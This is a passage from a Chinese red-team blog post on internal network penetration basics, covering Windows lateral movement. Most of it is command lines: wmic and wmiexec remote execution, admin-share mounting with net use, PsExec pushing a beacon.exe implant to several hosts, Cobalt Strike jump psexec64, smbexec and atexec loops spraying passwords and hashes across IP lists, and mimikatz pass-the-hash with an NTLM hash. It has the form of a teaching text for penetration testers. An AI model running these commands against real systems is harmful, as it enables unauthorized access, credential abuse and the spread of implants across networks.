<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>



<link rel="canonical" href="http://example.com/2024/08/08/nei-wang-shen-tou-ji-chu/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2024/08/08/nei-wang-shen-tou-ji-chu/","path":"2024/08/08/nei-wang-shen-tou-ji-chu/","title":"内网渗透基础"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>内网渗透基础 | Y0ng's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Y0ng's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91"><span class="nav-text">内网</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#KB2871997-amp-KB2928120"><span class="nav-text">KB2871997 &amp; KB2928120</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#UNC%E8%B7%AF%E5%BE%84"><span class="nav-text">UNC路径</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WMI"><span class="nav-text">WMI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#135%E7%AB%AF%E5%8F%A3"><span class="nav-text">135端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMIEXEC"><span class="nav-text">WMIEXEC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wmiexec-exe"><span class="nav-text">wmiexec.exe</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#137%EF%BC%8C138%EF%BC%8C139%E7%AB%AF%E5%8F%A3"><span class="nav-text">137，138，139端口</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#445%E7%AB%AF%E5%8F%A3"><span class="nav-text">445端口</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ipc"><span class="nav-text">ipc$</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A9%E5%B1%95%E8%AF%AD%E6%B3%95"><span class="nav-text">扩展语法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F-SMB-445-%E7%AB%AF%E5%8F%A3"><span class="nav-text">横向渗透 SMB(445 端口)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#psexec"><span class="nav-text">psexec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cs-plugins"><span class="nav-text">cs - plugins</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SMBEXEC"><span class="nav-text">SMBEXEC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#atexec"><span class="nav-text">atexec</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PTH"><span class="nav-text">PTH</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mimikatz-PTH"><span class="nav-text">mimikatz - PTH</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PTK"><span class="nav-text">PTK</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PTT"><span class="nav-text">PTT</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#smbclient"><span class="nav-text">smbclient</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%A4%E8%AF%81%E7%99%BB%E5%BD%95"><span class="nav-text">认证登录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A9%BA%E4%BC%9A%E8%AF%9D%E6%9E%9A%E4%B8%BE"><span class="nav-text">空会话枚举</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#rpcclient"><span class="nav-text">rpcclient</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#crackmapexec"><span class="nav-text">crackmapexec</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">执行命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cme%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F"><span class="nav-text">cme网络扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE%E7%A9%BA%E4%BC%9A%E8%AF%9D"><span class="nav-text">枚举空会话</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96"><span class="nav-text">凭证获取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">msf反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE%E8%BF%9C%E7%A8%8B%E7%9B%AE%E6%A0%87%E4%B8%8A%E7%9A%84%E6%B4%BB%E5%8A%A8%E4%BC%9A%E8%AF%9D"><span class="nav-text">枚举远程目标上的活动会话</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="nav-text">密码喷洒</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%A4%E8%AF%81"><span class="nav-text">认证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#winRM"><span class="nav-text">winRM</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#at%E3%80%81schtasks"><span class="nav-text">at、schtasks</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sharpwmi"><span class="nav-text">sharpwmi</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nbtscan"><span class="nav-text">nbtscan</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#winRM-1"><span class="nav-text">winRM</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#evil-winrm"><span class="nav-text">evil-winrm</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WinRS"><span class="nav-text">WinRS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DCOM"><span class="nav-text">DCOM</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SCShell"><span class="nav-text">SCShell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No445"><span class="nav-text">No445</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E7%AB%A0%E8%AF%B4%E6%98%8E"><span class="nav-text">文章说明</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Y0ng</p>
  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/08/nei-wang-shen-tou-ji-chu/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Y0ng">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Y0ng's Blog">
      <meta itemprop="description" content="花有重开日，人无再少年">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="内网渗透基础 | Y0ng's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          内网渗透基础
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-08-08 00:00:00" itemprop="dateCreated datePublished" datetime="2024-08-08T00:00:00+08:00">2024-08-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Red-Team/" itemprop="url" rel="index"><span itemprop="name">Red-Team</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/202304041241136.png" alt="202304041241136"></p>
<a id="more"></a>

<h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><p>内网指的是内部局域网，常说的 LAN（local area network）。常见家庭 wifi 网络和小型的企业网络，通常内部计算机直接访问路由器设备，路由器设备接入移动电信的光纤实现上网。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1.png"></p>
<p>内部局域网可以通过交换机 / 防火墙组成多个网络（局域），多个局域之间进行访问控制。新概念（安全域）。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/2.png"></p>
<p>如专门存放服务器的统称为 DMZ（非军事化区域），运维区，内网办公区等，常说的内网渗透就是在局域网内部渗透，<strong>内网渗透比较有难度的是域渗透</strong>。</p>
<h1 id="KB2871997-amp-KB2928120"><a href="#KB2871997-amp-KB2928120" class="headerlink" title="KB2871997 &amp; KB2928120"></a>KB2871997 &amp; KB2928120</h1><p>微软在 2014 年发布了 <code>KB2871997</code> 和 <code>KB2928120</code> 两个补丁，用来阻止域内主机本地用户的网络登录，这样就无法以本地管理员的权限执行 <code>wmi、psexec、schtasks、at和文件访问共享</code>，本地用户的 PTH 方式已经死掉，然而默认的 Administrator（SID 500）这个账户仍可以进行 PTH，并且在禁用 NTLM 的情况下，psexec 无法进行远程连接，但是使用 mimikatz 可以攻击成功。</p>
<h1 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h1><p>UNC 路径代表 <code>通用命名约定</code> 路径（Universal Naming Convention），它是一种网络路径格式，用于标识在网络上共享的资源位置。UNC 路径允许您在本地网络中访问远程共享。</p>
<p>UNC 路径由两个反斜杠 <code>\</code>，后跟远程计算机的名称或 IP 地址、可选的共享名称、可选的路径和文件名组成。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\\ComputerName\ShareName\Path\FileName</span><br></pre></td></tr></table></figure>

<p>其中 ComputerName 是远程计算机的名称或 IP 地址，ShareName 是共享名称，在访问共享时需要使用该名称，Path 是共享文件夹中的路径，FileName 是所需文件的名称。</p>
<h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><p>WMI（Windows management instrumentation）可以描述为管理 Windows 系统的方法和功能，我们可以把它当作 API 来与 Win 系统进行相互交流，WMI 在渗透测试中的价值在于它不需要下载和安装，WMI 是 Windows 系统自带功能。而且整个运行过程都在计算机内存中发生，不会留下任何痕迹。</p>
<h2 id="135端口"><a href="#135端口" class="headerlink" title="135端口"></a>135端口</h2><p>RPC：远程过程调用服务，WMIC（winsows management instrumentation）用到这个端口。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/3.png"></p>
<p>wmic 具体用法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 打开一个计算器</span><br><span class="line">wmic &#x2F;node:ip &#x2F;user:用户名 &#x2F;password:密码 PROCESS call create &quot;calc.exe&quot; </span><br><span class="line"></span><br><span class="line">#无回显</span><br><span class="line">wmic &#x2F;node:192.168.1.56 &#x2F;user:administrator &#x2F;password:aab+1s PROCESS call create &quot;calc.exe&quot;</span><br><span class="line">wmic &#x2F;node:192.168.1.56 &#x2F;user:administrator &#x2F;password:aab+1s process call create &quot;cmd.exe &#x2F;c ipconfig &gt;C:\1.txt&quot;</span><br></pre></td></tr></table></figure>

<p>连接报错如下信息：</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/4.png"></p>
<p>ip 错了报如下信息：</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/5.png"></p>
<p>密码填错报如下信息：</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/6.png"></p>
<p>用另一台计算机尝试连接，正常访问，命令执行成功，wmic 执行后无回显，需写入到文本文件中。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/7.png"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/8.png"></p>
<h2 id="WMIEXEC"><a href="#WMIEXEC" class="headerlink" title="WMIEXEC"></a>WMIEXEC</h2><p>获取交互式 shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript.exe &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.1.56 administrator aab+1s</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/9.png"></p>
<p>执行单条命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript.exe &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;cmd 192.168.1.56 administrator aab+1s &quot;cmdkey &#x2F;list&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10.png"></p>
<p>如上是提供了密码，如无密码，可以利用 wce 的 hash 注入，然后执行 wmiexec 就可以了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wce –s 账号:主机名或域的名字:LM:NTLM</span><br><span class="line"></span><br><span class="line">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.0.1</span><br></pre></td></tr></table></figure>

<p>如果抓取的 LM hash 是 AAD3 开头的，或者是 No Password 之类的，计用 32 个 0 代替 LM hash</p>
<h2 id="wmiexec-exe"><a href="#wmiexec-exe" class="headerlink" title="wmiexec.exe"></a>wmiexec.exe</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmiexec.exe .&#x2F;administrator:aab+1s@192.168.1.56 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/11.png"></p>
<p>hash 传递</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmiexec.exe -hashes 00000000000000000000000000000000:04cea78fa35a5be51f4aee6375651e8a WIN-P6KD23KACIJ&#x2F;Administrator@192.168.10.173 &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/rootclay/WMIHACKER/blob/master/README_zh.md">https://github.com/rootclay/WMIHACKER/blob/master/README_zh.md</a></p>
<h1 id="137，138，139端口"><a href="#137，138，139端口" class="headerlink" title="137，138，139端口"></a>137，138，139端口</h1><p>137、138 为 UDP 端口，主要用于内网传输文件，NetBios/SMB 服务的获取主要是通过 139 端口。</p>
<h1 id="445端口"><a href="#445端口" class="headerlink" title="445端口"></a>445端口</h1><p>共享文件夹、共享打印机</p>
<h2 id="ipc"><a href="#ipc" class="headerlink" title="ipc$"></a>ipc$</h2><p><code>IPC$ </code>是共享 “命名管道” 的资源，为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问，从 NT/2000 开始使用。</p>
<p>IPC$ 在同一时间内，两个 IP 之间只允许建立一个连接。</p>
<p>NT/2000 在提供了 ipc$ 功能的同时，在初次安装系统时还打开了默认共享，即所有的逻辑共享 ( c$, d$ , e$……) 和系统目录 winnt 或管理员目录 (admin$) 共享。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.1.56\c$ &quot;password&quot; &#x2F;user:&quot;domain\username&quot;</span><br><span class="line">net use \\192.168.1.56\c$ &quot;aab+1s&quot; &#x2F;user:administrator</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/12.png"></p>
<p>另一台主机 net use 远程连接</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/13.png"></p>
<h2 id="扩展语法"><a href="#扩展语法" class="headerlink" title="扩展语法"></a>扩展语法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.1.56\c$</span><br><span class="line"></span><br><span class="line"># 删除ipc$连接</span><br><span class="line">net use \\192.168.1.56\ipc$ &#x2F;del</span><br><span class="line"></span><br><span class="line"># 将目标磁盘映射到本地</span><br><span class="line">net use z: \\192.168.1.56\c$</span><br><span class="line"></span><br><span class="line"># 删除映射</span><br><span class="line">net use z: &#x2F;del</span><br><span class="line"></span><br><span class="line"># 关闭共享</span><br><span class="line">net use ipc$ &#x2F;del</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://yoga7xm.top/2019/03/24/IPentest-base/#IPC-%E7%A9%BA%E8%BF%9E%E6%8E%A5">ipc$空连接</a></p>
<h1 id="横向渗透-SMB-445-端口"><a href="#横向渗透-SMB-445-端口" class="headerlink" title="横向渗透 SMB(445 端口)"></a>横向渗透 SMB(445 端口)</h1><p>利用 SMB 服务，需要先建立 IPC，可以通过 hash 传递来远程执行，默认回来 System 权限，需要目标防火墙开启 445 并允许通过。</p>
<h2 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.1.56\c$ &quot;aab+1s&quot; &#x2F;user:administrator</span><br><span class="line"></span><br><span class="line">PsExec.exe \\192.168.1.56 whoami</span><br><span class="line"></span><br><span class="line">.\PsExec.exe -u administrator -p 123456 \\dc01 cmd</span><br><span class="line"></span><br><span class="line"># 交互式shell（相同凭证可直接登录）</span><br><span class="line">psexec -accepteula \\ip -s cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/14.png"></p>
<p>执行原理</p>
<ol>
<li>通过 <code>ipc$</code> 连接，释放 <code>psexecsvc.exe</code> 到目标</li>
<li>通过服务管理 <code>SCManager</code> 远程创建 <code>psexecsvc</code> 服务，并启动服务。</li>
<li>客户端连接执行命令，服务端启动相应的程序并执行回显数据。</li>
<li>运行完后删除服务。这个在 windows 的日志中有详细的记录，另外 psexec 在少数情况下会出现服务没删除成功的 bug，所以一般不推荐使用 psexec，推荐 wmiexec</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\Temp\PsExec.exe -accepteula \\192.168.144.155,192.168.144.196 -u administrator -p admin@123 -d -c C:\WINDOWS\Temp\beacon.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/15.png"></p>
<h2 id="cs-plugins"><a href="#cs-plugins" class="headerlink" title="cs - plugins"></a>cs - plugins</h2><p>选中需横向的主机，jump-psexec64</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/16.png"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/17.png"></p>
<p>选择一个认证，listen 如果可出网，选择 1，内网横向则用 smb beacon2。</p>
<p>直接使用命令行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jump [module] [target] [listener]</span><br><span class="line">jump psexec64 192.168.10.173 local</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/18.png"></p>
<p>通过 psexec 横向到目标机器，凭证用的是已知凭证去碰撞</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/19.png"></p>
<p>此时整体拓扑如下，是父子关系，这是因为用的是 http beacon 直接连接 teamserver，如果用 smb beacon 就是 link 关系。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20.png"></p>
<p>换一下 smb beacon</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/21.png"></p>
<p>主机 ip 后面带有四个圆圈。</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/22.png"></p>
<p>smb 的箭头是黄色</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sup3rman/p/12381874.html">https://www.cnblogs.com/sup3rman/p/12381874.html</a></p>
<h1 id="SMBEXEC"><a href="#SMBEXEC" class="headerlink" title="SMBEXEC"></a>SMBEXEC</h1><p><strong>明文传递</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbexec.exe administrator:aab+1s@192.168.10.173</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/23.png"></p>
<p><strong>hash传递</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hash传递：</span><br><span class="line">smbexec -hashes :$HASH$ admin@192.168.10.173</span><br><span class="line">smbeexec -hashes :$HASH$ domain&#x2F;admin@192.168.10.173</span><br></pre></td></tr></table></figure>

<p>dump hash</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/24.png"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/25.png"></p>
<h1 id="atexec"><a href="#atexec" class="headerlink" title="atexec"></a>atexec</h1><p>批量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR &#x2F;F %%i in (ips.txt) do net use \\%%i\ipc$ &quot;admin!@#45&quot; &#x2F;user:administrator #批量检测 IP 对应明文 连接 </span><br><span class="line"></span><br><span class="line">FOR &#x2F;F %%i in (ips.txt) do atexec.exe .&#x2F;administrator:admin!@#45@%%i whoami #批量检测 IP 对应明文 回显版 </span><br><span class="line"></span><br><span class="line">FOR &#x2F;F %%i in (pass.txt) do atexec.exe .&#x2F;administrator:%%i@192.168.3.21 whoami #批量检测明文对应 IP 回显版 </span><br><span class="line"></span><br><span class="line">FOR &#x2F;F %%i in (hash.txt) do atexec.exe -hashes :%%i .&#x2F;administrator@192.168.3.21 whoami #批量检测 HASH 对应 IP 回显版</span><br></pre></td></tr></table></figure>



<h1 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h1><p>域 / 工作组环境，内存中存在和当前机器相同的密码，在身份验证过程中，基本过程是从用户那里收集密码，然后对其进行加密，然后将正确密码的加密哈希用于将来的身份验证。</p>
<p>初次认证后，Windows 将哈希值保存在内存中，这样用户就不必一次又一次地输入密码。</p>
<p>在凭证转储期间，我们看到我们已经提取了大量的哈希值。现在作为攻击者，我们不知道密码。因此，在身份验证期间，我们提供哈希而不是密码。</p>
<p>Windows 比较哈希值并热烈欢迎攻击者。简而言之，这就是 Pass-the-Hash 攻击。</p>
<p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/">https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/</a></p>
<h2 id="mimikatz-PTH"><a href="#mimikatz-PTH" class="headerlink" title="mimikatz - PTH"></a>mimikatz - PTH</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:WIN-P6KD23KACIJ &#x2F;ntlm:04cea78fa35a5be51f4aee6375651e8a</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/26.png"></p>
<p>弹出窗口后，连接共享端口，传输文件</p>
